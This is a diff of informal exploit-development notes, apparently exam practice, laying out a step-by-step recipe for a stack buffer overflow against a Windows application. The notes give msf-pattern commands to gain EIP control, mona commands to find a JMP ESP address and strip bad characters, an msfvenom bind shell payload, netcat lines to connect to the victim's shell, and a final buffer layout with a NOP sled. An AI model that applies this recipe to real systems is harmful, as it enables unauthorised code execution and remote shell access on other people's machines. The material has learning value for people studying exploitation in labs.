@@ -2,41 +2,71 @@
 >> nmap -p<vuln_app_port> ip 
 
 
+>> Confirm if the Application is Crashing
+
+
+
 ##::::::>>>>>>>:::::::::::::::PATTERN::::::::::::<<<<<:::::::::::::::::::::::::::::::
 
->> msf-pattern_create -l <lenght_of_char>
->> msf-patter_offset -q <EIP_value>
+>> msf-pattern_create -l <lenght_of_chars_to_test>
+>> msf-pattern_offset -q <EIP_value>
 
 -------------------------------------------------
 then check if we can control EIP using BBBB
-
-
-##::::::::::::::::::::::::::::::BAD CHARS::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-
->> !mona config -set workingfolder C:\logs\%p
->> !mona bytearray
->> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01B27464
->> !mona bytearray -b "\x00\x01\x02"
->> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01337IIO
-
-
-##::::::::::::::::::::::::::::::BAD CHARS : MANUAL WAY::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-
-
 
 
 
 ##::::::::::::::::::::::::::::::::JMP ESP:::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 >> !mona modules
->> !mona find -s "\xff\xe4" -m app.dll   or >>!mona find -s "\xff\xe4" -m app.exe
+-----> then check which module has all values as false
+
+>> if dll or exe use the following command to find the jmp esp address !
+
+>> !mona find -s "\xff\xe4" -m app.dll   or  >>!mona find -s "\xff\xe4" -m app.exe
 
 ----------------------------------------------------
 in case no jmp esp . check for call esp ---> mona modules --> check dlls --> dubba click on any dll --> ctrl + f --> jmp esp or call esp --> note the address
 ----------------------------------------------------
 
+suppose jmp esp address is 56526683 -- convert it like this--> \x83\x66\x52\x56
 
-##:::::::::::::::::::::::::::::::::::SHELL:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+JMP ESP value found !  \x83\x66\x52\x56
+
+THIS VALUE WILL COME IN PLACE OF "BBBB" ;)
+
+
+
+##::::::::::::::::::::::::::::::BAD CHARS : MANUAL WAY:    fastest waY ! :::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+USE  
+>> !mona config -set workingfolder C:\logs\%p
+>> !mona bytearray
+
+to generate a array and copy it to a file in kali .  This new array will be sent after "BBBB".
+
+Use it to send this to the application and check for missing characters comparing to the original byte array
+HOW ?
+1) sent the byte array !
+2) right click " ESP" and "Follow in Dump"
+3) compare the pattern and whichever is missing is the bad character !
+4) Note the bad charcter in a comment line and update the payload and send again !
+5) Repeat until no more Bad Character !
+
+
+______________________________________________****  FINAL SCENE  ****** _____________________________________________
+no more bad char
+
+lets create our final exploit !
+
+EXAMPLE ---- 
+
+#bad chars = x00 x04 x11 x40 x61 x78 xa2
+
+#esp jump value =  \x83\x66\x52\x56
+
+
+
 >> msfvenom -a x86 -p windows/shell/bind_tcp lport=4444 -b "\x00\xd1\x25" -f python
 >> nc -nv <Victim_ip> 4444
 
@@ -44,6 +74,18 @@ in case no jmp esp . check for call esp ---> mona modules --> check dlls --> dub
 >> nc -nlvp 4444
 
 
-##::::::::::::::::::::::::::::::::::FINAL SCRIPT:::::::::::::::::::::::::::::::::::::::::::::::::::
+&
+
 
 buff= A * 300 + "jmp_esp_written_in_reverse" + "\x90" * 15 + buf         
+
+SAVE IT 
+
+--->
+
+EXPLOIT !
+
+
+
+
+
